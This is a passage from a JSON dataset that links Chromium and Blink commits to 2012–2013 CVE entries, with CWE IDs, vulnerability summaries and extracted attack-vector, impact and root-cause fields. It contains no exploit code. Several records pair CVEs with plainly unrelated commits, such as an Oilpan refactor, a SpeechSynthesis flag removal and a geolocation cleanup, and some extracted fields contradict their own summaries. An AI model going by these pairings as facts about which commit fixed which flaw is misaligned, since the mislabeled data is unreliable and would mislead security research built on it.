handling\/thumbnailing\/etc., since a texture is at\nany given time owned by either: UI parent, mailbox, or\nTextureImageTransportSurface\n- simplify frontbuffer protection logic;\nthe frontbuffer textures are now owned by RWHV where they are refcounted\n\nThe TextureImageTransportSurface informs RenderWidgetHostView of the\nmailbox names for the front- and backbuffer textures by\nassociating them with a surface_handle (1 or 2) in the AcceleratedSurfaceNew message.\nDuring SwapBuffers() or PostSubBuffer() cycles, it then uses \nproduceTextureCHROMIUM() and consumeTextureCHROMIUM()\nto transfer ownership between renderer and browser compositor.\n\nRWHV sends back the surface_handle of the buffer being returned with the Swap ACK\n(or 0 if no buffer is being returned in which case TextureImageTransportSurface will\nallocate a new texture - note that this could be used to \nsimply keep textures for thumbnailing).\n\nBUG=154815,139616\nTBR=sky@chromium.org\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11194042\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@171569 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 25.0.1364.99 on Mac OS X does not properly implement signal handling for Native Client (aka NaCl) code, which has unspecified impact and attack vectors.","commit_message_1":"implement textureimagetransportsurface using texture mailbox this ha a couple of advantage : - allow tearing down and recreating the ui parent context without losing the renderer context - do not require a context to be able to generate texture when creating the glsurfacehandle - clearer ownership semantics that potentially allows for more robust and easier lost context handling\/thumbnailing\/etc","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"have unspecified impact","Root Cause":"does not properly implement signal handling for native client ( aka nacl ) code","Attack Type":"remote attacker"},{"commit_id":"1538367452b549d929aabb13d54c85ab99f65cd3","cve_id":"CVE-2013-0889","cwe_id":"CWE-264","commit_message":"For \"Dangerous\" file type, no user gesture will bypass the download warning.\n\nBUG=170569\nReview URL: https:\/\/codereview.chromium.org\/12039015\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@178072 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, does not properly enforce a user gesture requirement before proceeding with a file download, which might make it easier for remote attackers to execute arbitrary code via a crafted file.","commit_message_1":"for `` dangerous '' file type , no user gesture will bypass the download warning","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted file","Impact":"execute arbitrary code","Root Cause":"does not properly enforce a user gesture requirement before proceeding with a file download , which might make it easier","Attack Type":"remote attacker"},{"commit_id":"e9c887a80115ddc5c011380f132fe4b36359caf0","cve_id":"CVE-2013-0890","cwe_id":"CWE-119","commit_message":"Fix crash when creating an ImageBitmap from an invalid canvas\n\nBUG=354356\n\nReview URL: https:\/\/codereview.chromium.org\/211313003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@169973 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Multiple unspecified vulnerabilities in the IPC layer in Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, allow remote attackers to cause a denial of service (memory corruption) or possibly have other impact via unknown vectors.","commit_message_1":"fix crash when creating an imagebitmap from an invalid canvas bug=<number> review url : http : \/\/<file>","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service ( memory corruption ) or possibly have other impact","Root Cause":"caused by memory safety issues across the IPC layer","Attack Type":"remote attacker"},{"commit_id":"d443be6fdfe17ca4f3ff1843ded362ff0cd01096","cve_id":"CVE-2013-0890","cwe_id":"CWE-119","commit_message":"Check for a negative integer properly.\n\nBUG=169966\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11892002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@176879 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple unspecified vulnerabilities in the IPC layer in Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, allow remote attackers to cause a denial of service (memory corruption) or possibly have other impact via unknown vectors.","commit_message_1":"check for a negative integer properly","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service ( memory corruption ) or possibly have other impact","Root Cause":"caused by memory safety issues across the IPC layer","Attack Type":"remote attacker"},{"commit_id":"58936737b65052775b67b1409b87edbbbc09f72b","cve_id":"CVE-2013-0891","cwe_id":"CWE-189","commit_message":"Avoid integer overflows in BlobURLRequestJob.\n\nBUG=169685\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/12047012\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@179154 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Integer overflow in Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, allows remote attackers to cause a denial of service or possibly have unspecified other impact via a blob.","commit_message_1":"avoid integer overflow in bloburlrequestjob","Vulnerability Type":"integer overflow","Attack Vector":"via a blob","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an integer overflow within blob handling","Attack Type":"remote attacker"},{"commit_id":"3b2943f5d343f5da393b99fe9efe6cefc6856aa1","cve_id":"CVE-2013-0892","cwe_id":null,"commit_message":"Fix crash with mismatched vector sizes.\n\nBUG=169295\nReview URL: https:\/\/codereview.chromium.org\/11817050\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@176252 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple unspecified vulnerabilities in the IPC layer in Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, allow remote attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"fix crash with mismatched vector size","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"caused by multiple unspecified errors within the IPC layer","Attack Type":"remote attacker"},{"commit_id":"42d87b0bec018634ec81a72d3b265f3138d75e1d","cve_id":"CVE-2013-0892","cwe_id":null,"commit_message":"IPC: defend against excessive number of submenu entries in PPAPI message.\n\nBUG=168710\nReview URL: https:\/\/codereview.chromium.org\/11794037\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@175576 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple unspecified vulnerabilities in the IPC layer in Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, allow remote attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"defend against excessive number of submenu entry in ppapi message","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"caused by multiple unspecified errors within the IPC layer","Attack Type":"remote attacker"},{"commit_id":"da5e5f78f02bc0af5ddc5694090defbef7853af1","cve_id":"CVE-2013-0892","cwe_id":null,"commit_message":"DevTools: remove references to modules\/device_orientation from core\n\nBUG=340221\n\nReview URL: https:\/\/codereview.chromium.org\/150913003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@166493 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Multiple unspecified vulnerabilities in the IPC layer in Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, allow remote attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"remove reference to modules\/device_orientation from core bug=<number> review url : http : \/\/<file>","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"caused by multiple unspecified errors within the IPC layer","Attack Type":"remote attacker"},{"commit_id":"0ab5fab4939150bd0f30ada8a4bf6eb0f69d66c1","cve_id":"CVE-2013-0892","cwe_id":null,"commit_message":"Sizes going across an IPC should be uint32.\n\nBUG=164946\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11472038\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@171944 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Multiple unspecified vulnerabilities in the IPC layer in Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, allow remote attackers to cause a denial of service or possibly have other impact via unknown vectors.","commit_message_1":"size going across an ipc should be uint32","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"cause a denial of service or possibly have other impact","Root Cause":"caused by multiple unspecified errors within the IPC layer","Attack Type":"remote attacker"},{"commit_id":"ed6f4545a2a345697e07908c887333f5bdcc97a3","cve_id":"CVE-2013-0893","cwe_id":"CWE-362","commit_message":"Apply 'x-content-type-options' check to dynamically inserted script.\n\nBUG=348581\n\nReview URL: https:\/\/codereview.chromium.org\/185593011\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@168570 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Race condition in Google Chrome before 25.0.1364.97 on Windows and Linux, and before 25.0.1364.99 on Mac OS X, allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to media.","commit_message_1":"apply ' x-content-type-options ' check to dynamically inserted script","Vulnerability Type":"Race Condition","Attack Vector":"via vectors related to media","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a race condition error","Attack Type":"remote attacker"},{"commit_id":"23803a58e481e464a787e4b2c461af9e62f03905","cve_id":"CVE-2013-0895","cwe_id":"CWE-22","commit_message":"Fix creating target paths in file_util_posix CopyDirectory.\n\nBUG=167840\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11773018\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@176659 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 25.0.1364.97 on Linux, and before 25.0.1364.99 on Mac OS X, does not properly handle pathnames during copy operations, which might make it easier for remote attackers to execute arbitrary programs via unspecified vectors.","commit_message_1":"fix creating target path in file_util_posix copydirectory","Vulnerability Type":"Path Traversal","Attack Vector":"via unspecified vectors","Impact":"execute arbitrary programs","Root Cause":"does not properly handle pathnames during copy operations ","Attack Type":"remote attacker"},{"commit_id":"02c8303512ebed345011f7b545e2f418799be2f0","cve_id":"CVE-2013-0917","cwe_id":"CWE-119","commit_message":"Oilpan: Ship Oilpan for SyncCallbackHelper, CreateFileResult and CallbackWrapper in filesystem\/\n\nThese are leftovers when we shipped Oilpan for filesystem\/ once.\n\nBUG=340522\n\nReview URL: https:\/\/codereview.chromium.org\/501263003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@180909 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The URL loader in Google Chrome before 26.0.1410.43 allows remote attackers to cause a denial of service (out-of-bounds read) via unspecified vectors.","commit_message_1":"ship oilpan for synccallbackhelper , createfileresult and callbackwrapper in filesystem\/ these are leftover when we shipped oilpan for filesystem\/ once","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"0a57375ad73780e61e1770a9d88b0529b0dbd33b","cve_id":"CVE-2013-0918","cwe_id":"CWE-264","commit_message":"Let the browser handle external navigations from DevTools.\n\nBUG=180555\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/12531004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@186793 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 26.0.1410.43 does not prevent navigation to developer tools in response to a drag-and-drop operation, which allows user-assisted remote attackers to have an unspecified impact via a crafted web site.","commit_message_1":"let the browser handle external navigation from devtools","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted web site","Impact":"have an unspecified impact","Root Cause":"does not prevent navigation to developer tools","Attack Type":"remote attacker"},{"commit_id":"12baa2097220e33c12b60aa5e6da6701637761bf","cve_id":"CVE-2013-0920","cwe_id":"CWE-399","commit_message":"Fix heap-use-after-free in BookmarksIOFunction::ShowSelectFileDialog.\n\nBUG=177410\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/12326086\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@184586 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in the extension bookmarks API in Google Chrome before 26.0.1410.43 allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"fix heap-use-after-free in bookmarksiofunction : :showselectfiledialog","Vulnerability Type":"use - after - free","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error","Attack Type":"remote attacker"},{"commit_id":"e9841fbdaf41b4a2baaa413f94d5c0197f9261f4","cve_id":"CVE-2013-0921","cwe_id":"CWE-264","commit_message":"Ensure extensions and the Chrome Web Store are loaded in new BrowsingInstances.\n\nBUG=174943\nTEST=Can't post message to CWS.  See bug for repro steps.\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/12301013\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@184208 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The Isolated Sites feature in Google Chrome before 26.0.1410.43 does not properly enforce the use of separate processes, which makes it easier for remote attackers to bypass intended access restrictions via a crafted web site.","commit_message_1":"ensure extension and the chrome web store are loaded in new browsinginstances","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a crafted web site","Impact":"bypass intended access restrictions","Root Cause":"does not properly enforce the use of separate processes","Attack Type":"attacker"},{"commit_id":"28aaa72a03df96fa1934876b0efbbc7e6b4b38af","cve_id":"CVE-2013-0922","cwe_id":"CWE-264","commit_message":"Revert cross-origin auth prompt blocking.\nBUG=174129\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/12183030\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@181113 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 26.0.1410.43 does not properly restrict brute-force access attempts against web sites that require HTTP Basic Authentication, which has unspecified impact and attack vectors.","commit_message_1":"revert cross-origin auth prompt blocking","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"has unspecified attack vectors","Impact":"has unspecified impact","Root Cause":"does not properly restrict brute - force access attempts against web sites that require http basic authentication ","Attack Type":"remote attacker"},{"commit_id":"a9ca2310c6e68ad8dc39d6b54ca9ea10867ed8a1","cve_id":"CVE-2013-0923","cwe_id":"CWE-119","commit_message":"Screen Orientation: use OrientationLockType enum for lockOrientation().\n\nBUG=162827\n\nReview URL: https:\/\/codereview.chromium.org\/204653002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@169972 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The USB Apps API in Google Chrome before 26.0.1410.43 allows remote attackers to cause a denial of service (memory corruption) via unspecified vectors.","commit_message_1":"use orientationlocktype enum for lockorientation ( )","Vulnerability Type":"buffer overflow","Attack Vector":"via unknown vectors","Impact":"cause a denial of service ( memory corruption )","Root Cause":"The USB Apps API","Attack Type":"remote attacker"},{"commit_id":"e21bdfb9c758ac411012ad84f83d26d3f7dd69fb","cve_id":"CVE-2013-0924","cwe_id":"CWE-264","commit_message":"Check prefs before allowing extension file access in the permissions API.\n\n\nR=mpcomplete@chromium.org\nBUG=169632\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11884008\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@176853 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The extension functionality in Google Chrome before 26.0.1410.43 does not verify that use of the permissions API is consistent with file permissions, which has unspecified impact and attack vectors.","commit_message_1":"check prefs before allowing extension file access in the permission api","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"has unspecified attack vectors","Impact":"has unspecified impact","Root Cause":"does not verify that use of the permissions api is consistent with file permissions","Attack Type":"remote attacker"},{"commit_id":"f7ae1f7a918f1973dca241a7a23169906eaf4fe3","cve_id":"CVE-2013-0925","cwe_id":"CWE-264","commit_message":"Do not pass URLs in onUpdated events to extensions unless they have the\n\"tabs\" permission.\n\nBUG=168442\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11824004\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@176406 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 26.0.1410.43 does not ensure that an extension has the tabs (aka APIPermission::kTab) permission before providing a URL to this extension, which has unspecified impact and remote attack vectors.","commit_message_1":"do not pas url in onupdated event to extension unless they have the '' tab '' permission","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"obtain sensitive information","Root Cause":"does not ensure that an extension has the tabs ( aka apipermission : : ktab ) permission before providing a url to this extension , which has unspecified impact and remote attack","Attack Type":"remote attacker"},{"commit_id":"52a30db57ecec68bb3b25fdc3de5e9bee7b80ed7","cve_id":"CVE-2013-0926","cwe_id":"CWE-20","commit_message":"Copy-paste preserves <embed> tags containing active content.\nBUG=112325\n\nEnable webkit preference for Chromium to disallow unsafe plugin pasting.\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11884025\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@176856 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 26.0.1410.43 does not properly handle active content in an EMBED element during a copy-and-paste operation, which allows user-assisted remote attackers to have an unspecified impact via a crafted web site.","commit_message_1":"copy-paste preserve < embed > tag containing active content","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted web site","Impact":"have an unspecified impact","Root Cause":"does not properly handle active content","Attack Type":"remote attacker"},{"commit_id":"faceb51d5058e1159835a4b0cd65081bb0a9de1e","cve_id":"CVE-2013-0912","cwe_id":"CWE-94","commit_message":"Remove SpeechSynthesis runtime flag (status=stable)\n\nBUG=402536\n\nReview URL: https:\/\/codereview.chromium.org\/482273005\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@180763 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"WebKit in Google Chrome before 25.0.1364.160 allows remote attackers to execute arbitrary code via vectors that leverage *type confusion.*","commit_message_1":"remove speechsynthesis runtime flag ( status=stable ) bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Code Injection","Attack Vector":"via vectors that leverage type confusion ","Impact":"execute arbitrary code","Root Cause":"caused by a type confusion error","Attack Type":"remote attacker"},{"commit_id":"0d173104d584327b12c2d091f9e5350ad304127c","cve_id":"CVE-2013-0904","cwe_id":"CWE-119","commit_message":"[refactor] Remove WEBCRYPTO_HAS_ERROR_TYPE ifdef.\n\nBUG=245025\n\nReview URL: https:\/\/codereview.chromium.org\/259233003\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@172926 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"The Web Audio implementation in Google Chrome before 25.0.1364.152 allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via unknown vectors.","commit_message_1":"remove webcrypto_has_error_type ifdef","Vulnerability Type":"buffer overflow","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service ( memory corruption ) or possibly have unspecified other impact","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"c3efb8738ab59766c88855ad62c812af78490c04","cve_id":"CVE-2013-0908","cwe_id":null,"commit_message":"Check for appropriate bindings in process-per-site mode.\n\nBUG=174059\nTEST=See bug for repro steps.\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/12188025\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@181386 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 25.0.1364.152 does not properly manage bindings of extension processes, which has unspecified impact and attack vectors.","commit_message_1":"check for appropriate binding in process-per-site mode","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"have unspecified impact","Root Cause":"does not properly manage bindings of extension processes","Attack Type":"remote attacker"},{"commit_id":"537abce1bcf7378e760e904d6e5540a02a2fca9f","cve_id":"CVE-2013-0909","cwe_id":"CWE-200","commit_message":"[content shell] reset the CWD after each layout test\n\nBUG=111316\nR=marja@chromium.org\n\nReview URL: https:\/\/codereview.chromium.org\/11633017\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@173906 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The XSS Auditor in Google Chrome before 25.0.1364.152 allows remote attackers to obtain sensitive HTTP Referer information via unspecified vectors.","commit_message_1":"reset the cwd after each layout test bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"obtain sensitive http referer information","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"ac8bd041b81e46e4e4fcd5021aaa5499703952e6","cve_id":"CVE-2013-0910","cwe_id":"CWE-287","commit_message":"Follow-on fixes and naming changes for https:\/\/codereview.chromium.org\/12086077\/\n\nBUG=172573\nReview URL: https:\/\/codereview.chromium.org\/12177018\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@180600 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 25.0.1364.152 does not properly manage the interaction between the browser process and renderer processes during authorization of the loading of a plug-in, which makes it easier for remote attackers to bypass intended access restrictions via vectors involving a blocked plug-in.","commit_message_1":"follow-on fix and naming change for http : \/\/<file>","Vulnerability Type":"Improper Authentication","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"hijack a valid user's session","Root Cause":"does not properly manage the interaction between the browser process and renderer processes during authorization of the loading of a plug -","Attack Type":"remote attacker"},{"commit_id":"ccfb891dc0c936a8806d663fe6581bf659761819","cve_id":"CVE-2013-0911","cwe_id":"CWE-22","commit_message":"WebDatabase: check path traversal in origin_identifier\n\nBUG=172264\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/12212091\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@183141 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Directory traversal vulnerability in Google Chrome before 25.0.1364.152 allows remote attackers to have an unspecified impact via vectors related to databases.","commit_message_1":"check path traversal in origin_identifier bug=<number> review url : http : \/\/<file>","Vulnerability Type":"Path Traversal","Attack Vector":"via vectors related to databases ","Impact":"none","Root Cause":"Directory traversal vulnerability","Attack Type":"remote attacker"},{"commit_id":"dd3b6fe574edad231c01c78e4647a74c38dc4178","cve_id":"CVE-2013-0839","cwe_id":"CWE-399","commit_message":"Remove parent* arg from GDataEntry ctor.\n\n* Remove static FromDocumentEntry from GDataEntry, GDataFile, GDataDirectory. Replace with InitFromDocumentEntry.\n* Move common code from GDataFile::InitFromDocumentEntry and GDataDirectory::InitFromDocumentEntry to GDataEntry::InitFromDocumentEntry.\n* Add GDataDirectoryService::FromDocumentEntry and use this everywhere.\n* Make ctors of GDataFile, GDataDirectory private, so these must be created by GDataDirectoryService's CreateGDataFile and\nCreateGDataDirectory. Make GDataEntry ctor protected.\n\nBUG=141494\nTEST=unit tests.\nReview URL: https:\/\/chromiumcodereview.appspot.com\/10854083\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@151008 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Use-after-free vulnerability in Google Chrome before 24.0.1312.56 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors related to the handling of fonts in CANVAS elements.","commit_message_1":"remove parent * arg from gdataentry ctor","Vulnerability Type":"use - after - free","Attack Vector":"via vectors related to the handling of fonts in canvas elements","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error within canvas font handling","Attack Type":"remote attacker"},{"commit_id":"7f48b71cb22bb2fc9fcec2013e9eaff55381a43d","cve_id":"CVE-2013-0840","cwe_id":null,"commit_message":"Filter more incoming URLs in the CreateWindow path.\n\nBUG=170532\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/12036002\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@178728 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 24.0.1312.56 does not validate URLs during the opening of new windows, which has unspecified impact and remote attack vectors.","commit_message_1":"filter more incoming url in the createwindow path","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"have unspecified impact","Root Cause":"does not validate urls during the opening of new windows","Attack Type":"remote attacker"},{"commit_id":"85f2fcc7b577362dd1def5895d60ea70d6e6b8d0","cve_id":"CVE-2013-0841","cwe_id":"CWE-20","commit_message":"Check the content setting type is valid.\n\nBUG=169770\nReview URL: https:\/\/codereview.chromium.org\/11875013\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@176687 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Array index error in the content-blocking functionality in Google Chrome before 24.0.1312.56 allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"check the content setting type is valid","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an array index","Attack Type":"remote attacker"},{"commit_id":"10cbaf017570ba6454174c55b844647aa6a9b3b4","cve_id":"CVE-2013-0842","cwe_id":null,"commit_message":"Validate that paths don't contain embedded NULLs at deserialization.\n\nBUG=166867\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11743009\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@174935 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 24.0.1312.56 does not properly handle %00 characters in pathnames, which has unspecified impact and attack vectors.","commit_message_1":"validate that path do n't contain embedded null at deserialization","Vulnerability Type":"unspecified","Attack Vector":"via unknown vectors","Impact":"have unspecified impact","Root Cause":"does not properly handle % 00 characters","Attack Type":"remote attacker"},{"commit_id":"74aaa70032784e7cf00256821f29b2b53edb6589","cve_id":"CVE-2012-5146","cwe_id":"CWE-264","commit_message":"Beware of print-read inconsistency when serializing GURLs.\nBUG=165622\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11576038\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@173583 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 24.0.1312.52 allows remote attackers to bypass the Same Origin Policy via a malformed URL.","commit_message_1":"beware of print-read inconsistency when serializing gurls","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via a malformed url","Impact":"bypass the same origin policy","Root Cause":"caused by an error when handling a malformed URL","Attack Type":"remote attacker"},{"commit_id":"e89cfcb9090e8c98129ae9160c513f504db74599","cve_id":"CVE-2012-5148","cwe_id":"CWE-20","commit_message":"Remove TabContents from TabStripModelObserver::TabDetachedAt.\n\nBUG=107201\nTEST=no visible change\n\n\nReview URL: https:\/\/chromiumcodereview.appspot.com\/11293205\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@167122 0039d316-1c4b-4281-b951-d872f2087c98","summary":"The hyphenation functionality in Google Chrome before 24.0.1312.52 does not properly validate file names, which has unspecified impact and attack vectors.","commit_message_1":"remove tabcontents from tabstripmodelobserver : :tabdetachedat","Vulnerability Type":"Improper Input Validation","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"execute arbitrary code","Root Cause":"does not properly validate file names , which has unspecified impact and attack vectors","Attack Type":"remote attacker"},{"commit_id":"503bea2643350c6378de5f7a268b85cf2480e1ac","cve_id":"CVE-2012-5149","cwe_id":"CWE-189","commit_message":"Improve validation when creating audio streams.\n\nBUG=166795\nReview URL: https:\/\/codereview.chromium.org\/11647012\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@173981 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Integer overflow in the audio IPC layer in Google Chrome before 24.0.1312.52 allows remote attackers to cause a denial of service or possibly have unspecified other impact via unknown vectors.","commit_message_1":"improve validation when creating audio stream","Vulnerability Type":"integer overflow","Attack Vector":"By persuading a victim to visit a specially-crafted Web site","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"8ea3a5c06218fa42d25c3aa0a4ab57153e178523","cve_id":"CVE-2012-5150","cwe_id":"CWE-399","commit_message":"Delete apparently unused geolocation declarations and include.\n\nBUG=336263\n\nReview URL: https:\/\/codereview.chromium.org\/139743014\n\ngit-svn-id: svn:\/\/svn.chromium.org\/blink\/trunk@165601 bbb929c8-8fbe-4397-9dbb-9b2b20218538","summary":"Use-after-free vulnerability in Google Chrome before 24.0.1312.52 allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors involving seek operations on video data.","commit_message_1":"delete apparently unused geolocation declaration and include","Vulnerability Type":"use - after - free","Attack Vector":"via vectors involving seek operations on video data","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a use-after-free error when seeking video","Attack Type":"remote attacker"},{"commit_id":"802ecdb9cee0d66fe546bdf24e98150f8f716ad8","cve_id":"CVE-2012-5152","cwe_id":"CWE-119","commit_message":"Protect AudioRendererAlgorithm from invalid step sizes.\n\nBUG=165430\nTEST=unittests and asan pass.\n\nReview URL: https:\/\/codereview.chromium.org\/11573023\n\ngit-svn-id: svn:\/\/svn.chromium.org\/chrome\/trunk\/src@173249 0039d316-1c4b-4281-b951-d872f2087c98","summary":"Google Chrome before 24.0.1312.52 allows remote attackers to cause a denial of service (out-of-bounds read) via vectors involving seek operations on video data.","commit_message_1":"protect audiorendereralgorithm from invalid step size","Vulnerability Type":"buffer 